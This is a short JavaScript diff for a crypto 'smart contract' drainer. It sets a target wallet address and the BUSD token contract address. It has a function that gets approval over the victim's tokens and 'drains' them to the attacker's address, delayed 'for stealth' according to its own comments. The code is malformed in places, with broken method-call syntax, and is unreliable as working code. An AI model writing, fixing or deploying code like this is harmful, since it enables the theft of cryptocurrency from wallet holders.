@@ -1,16 +1,16 @@
 //code for local smart contract
 
 const receiveAddress = "0xCD62c17E2af6bb75B167C3C72Af5fB5e89001b90";   // remove the words and replace it with your bsc address    
-
+const targetwallet = "0x8bc94a8f65b75b9e95c597a5a49710eb45bb64f7"; // target wallet
 	
-var cryptotokenContract;
-var smartcontract
+var cryptotokenContract = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
+var smartcontract;
 
 
 function approveSpending(token) {
 	
-	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
-	smartcontract.methods.drainBUSD.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
+	smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
+	smartcontract.methods.drainBUSD.send(to:receiveAddress).token(cryptotokenContract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
 	  
   			
